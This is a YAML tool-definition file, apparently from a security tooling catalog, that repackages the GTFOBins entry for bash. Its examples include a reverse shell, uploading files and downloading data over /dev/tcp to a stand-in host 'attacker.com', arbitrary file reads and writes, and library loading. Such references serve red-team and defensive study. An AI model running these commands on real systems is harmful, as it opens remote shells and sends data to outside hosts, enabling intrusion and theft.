---
id: shell-bash-bash
namespace: shell:bourne:bash
name: bash
description: GNU Bourne-Again SHell; can execute commands, read/write files, transfer data, and spawn shells Can also download files, read arbitrary files, write to arbitrary files, load arbitrary libraries, send a reverse shell, spawn an interactive shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- system.file.read
- system.file.write
- system.library.load
- security.execution.reverse-shell
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- bash
parameters: []
features: []
execution:
  template: bash
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"
- description: Download files
  command: bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
- description: Read arbitrary files
  command: bash -c 'echo "$(</path/to/input-file)"'
- description: Read arbitrary files
  command: 'HISTTIMEFORMAT=$''\r\e[K''

    history -c

    history -r /path/to/input-file

    history'
- description: Write to arbitrary files
  command: bash -c 'echo DATA >/path/to/output-file'
- description: Write to arbitrary files
  command: 'HISTIGNORE=''history *''

    history -c

    DATA

    history -w /path/to/output-file'
- description: Load arbitrary libraries
  command: bash -c 'enable -f /path/to/lib.so x'
- description: Send a reverse shell
  command: bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
- description: Spawn an interactive shell
  command: bash
- description: Upload files
  command: bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
- description: Upload files
  command: bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/bash/
techniques:
- collection
- exfiltration
- execution
- command-and-control
- privilege-escalation
install:
- method: apt
  package_name: bash
  commands:
  - apt-get install -y bash
---


# bash

bash is a command-line utility. GNU Bourne-Again SHell; can execute commands, read/write files, transfer data, and spawn shells Can also download files, read arbitrary files, write to arbitrary files, load arbitrary libraries, send a reverse shell, spawn an interactive shell, upload files.
